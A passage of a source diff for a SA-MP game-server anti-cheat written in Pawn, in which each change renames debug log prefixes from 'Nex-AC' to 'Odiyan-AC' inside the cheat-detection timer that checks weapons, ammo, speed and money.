+					printf("[Odiyan-AC debug] Max ping: %d, ping: %d", AC_MAX_PING, ac_gpp);
 				#endif
 				#undef AC_MAX_PING
 				#undef AC_MAX_PING_WARNINGS
@@ -8599,7 +8614,7 @@ ac_fpublic ac_Timer(playerid)
 									{
 										#if defined DEBUG
 											printf(DEBUG_CODE_5, playerid, "GivePlayerWeapon");
-											printf("[Nex-AC debug] AC weapon: %d, weaponid: %d", ACInfo[playerid][acSetWeapon][ac_i], ac_w);
+											printf("[Odiyan-AC debug] AC weapon: %d, weaponid: %d", ACInfo[playerid][acSetWeapon][ac_i], ac_w);
 										#endif
 										ac_KickWithCode(playerid, "", 0, 52, 13);
 										#if defined OnCheatDetected
@@ -8651,7 +8666,7 @@ ac_fpublic ac_Timer(playerid)
 									else if(ACInfo[playerid][acACAllow][15] && (!ac_IsWeaponWithAmmo(ac_w) || ac_a != 0))
 									{
 										#if defined DEBUG
-											printf("[Nex-AC debug] AC weaponid: %d, AC ammo: %d, weaponid: %d, ammo: %d",
+											printf("[Odiyan-AC debug] AC weaponid: %d, AC ammo: %d, weaponid: %d, ammo: %d",
 											ACInfo[playerid][acWeapon][ac_i], ACInfo[playerid][acAmmo][ac_i], ac_w, ac_a);
 										#endif
 										ac_KickWithCode(playerid, "", 0, 15, 2);
@@ -8685,7 +8700,7 @@ ac_fpublic ac_Timer(playerid)
 										{
 											#if defined DEBUG
 												printf(DEBUG_CODE_5, playerid, "SetPlayerAmmo");
-												printf("[Nex-AC debug] AC ammo: %d, ammo: %d, weaponid: %d",
+												printf("[Odiyan-AC debug] AC ammo: %d, ammo: %d, weaponid: %d",
 												ACInfo[playerid][acGiveAmmo][ac_i], ac_a, ac_w);
 											#endif
 											ac_KickWithCode(playerid, "", 0, 52, 14);
@@ -8708,7 +8723,7 @@ ac_fpublic ac_Timer(playerid)
 								(!ac_LagCompMode || !ac_IsBulletWeapon(ac_w) || ac_gtc - ACInfo[playerid][acShotTick] > 3850))
 								{
 									#if defined DEBUG
-										printf("[Nex-AC debug] AC ammo: %d, ammo: %d, weaponid: %d",
+										printf("[Odiyan-AC debug] AC ammo: %d, ammo: %d, weaponid: %d",
 										ACInfo[playerid][acAmmo][ac_i], ac_a, ac_w);
 									#endif
 									ac_KickWithCode(playerid, "", 0, 16, 2);
@@ -8741,7 +8756,7 @@ ac_fpublic ac_Timer(playerid)
 									if(ACInfo[playerid][acACAllow][16] && (!ac_LagCompMode || ac_gtc - ACInfo[playerid][acShotTick] > 3850))
 									{
 										#if defined DEBUG
-											printf("[Nex-AC debug] AC ammo: %d, ammo: %d, weaponid: %d",
+											printf("[Odiyan-AC debug] AC ammo: %d, ammo: %d, weaponid: %d",
 											ACInfo[playerid][acAmmo][ac_i], ac_a, ac_w);
 										#endif
 										ac_KickWithCode(playerid, "", 0, 16, 3);
@@ -8771,7 +8786,7 @@ ac_fpublic ac_Timer(playerid)
 					if(ac_dist >= ac_maxdist && (ACInfo[playerid][acSet][7] == -1 || ac_dist_set >= ac_maxdist))
 					{
 						#if defined DEBUG
-							printf("[Nex-AC debug] Dist: %f, dist set: %f, acSet[7]: %d, speed: %d, veh: %d",
+							printf("[Odiyan-AC debug] Dist: %f, dist set: %f, acSet[7]: %d, speed: %d, veh: %d",
 							ac_dist, ac_dist_set, ACInfo[playerid][acSet][7], ACVehInfo[ac_t][acSpeed], ac_t);
 						#endif
 						ac_KickWithCode(playerid, "", 0, 3, 3);
@@ -8792,7 +8807,7 @@ ac_fpublic ac_Timer(playerid)
 						{
 							#undef AC_MAX_SPEEDHACK_VEH_WARNINGS
 							#if defined DEBUG
-								printf("[Nex-AC debug] Speed: %d, last speed: %d, veh model: %d, veh: %d",
+								printf("[Odiyan-AC debug] Speed: %d, last speed: %d, veh model: %d, veh: %d",
 								ac_s, ACVehInfo[ac_t][acLastSpeed], ac_model, ac_t);
 							#endif
 							ac_KickWithCode(playerid, "", 0, 10, 4);
@@ -8821,7 +8836,7 @@ ac_fpublic ac_Timer(playerid)
 					if(ac_dist >= ac_maxdist && (ACInfo[playerid][acSet][7] == -1 || ac_dist_set >= ac_maxdist))
 					{
 						#if defined DEBUG
-							printf("[Nex-AC debug] Dist: %f, dist set: %f, acSet[7]: %d, speed: %d, old pos x, y: %f, %f",
+							printf("[Odiyan-AC debug] Dist: %f, dist set: %f, acSet[7]: %d, speed: %d, old pos x, y: %f, %f",
 							ac_dist, ac_dist_set, ACInfo[playerid][acSet][7], ACInfo[playerid][acSpeed], ACInfo[playerid][acLastPosX], ACInfo[playerid][acLastPosY]);
 						#endif
 						ac_KickWithCode(playerid, "", 0, 2, 6);
@@ -8843,7 +8858,7 @@ ac_fpublic ac_Timer(playerid)
 							if(++ACInfo[playerid][acCheatCount][20] > AC_MAX_NOP_TIMER_WARNINGS)
 							{
 								#if defined DEBUG
-									printf("[Nex-AC debug] Money: %d, old money: %d, price: %d",
+									printf("[Odiyan-AC debug] Money: %d, old money: %d, price: %d",
 									ac_t, ACInfo[playerid][acMoney], ACInfo[playerid][acSet][10]);
 								#endif
 								ac_KickWithCode(playerid, "", 0, 15, 4);
@@ -8871,7 +8886,7 @@ ac_fpublic ac_Timer(playerid)
 							if(++ACInfo[playerid][acCheatCount][21] > AC_MAX_NOP_TIMER_WARNINGS)
 							{
 								#if defined DEBUG
-									printf("[Nex-AC debug] Money: %d, old money: %d, components price: %d",
+									printf("[Odiyan-AC debug] Money: %d, old money: %d, components price: %d",
 									ac_t, ACInfo[playerid][acMoney], ACInfo[playerid][acSet][11]);
 								#endif
 								ac_KickWithCode(playerid, "", 0, 23, 6);
@@ -8900,7 +8915,7 @@ ac_fpublic ac_Timer(playerid)
 						{
 					#endif
 						#if defined DEBUG
-							printf("[Nex-AC debug] AC money: %d, money: %d, stunt bonus: %d, veh: %d, playerid: %d",
+							printf("[Odiyan-AC debug] AC money: %d, money: %d, stunt bonus: %d, veh: %d, playerid: %d",
 							ACInfo[playerid][acMoney], ac_t, ACInfo[playerid][acStuntBonus], ACInfo[playerid][acVeh], playerid);
 						#endif
 						#if defined OnCheatDetected
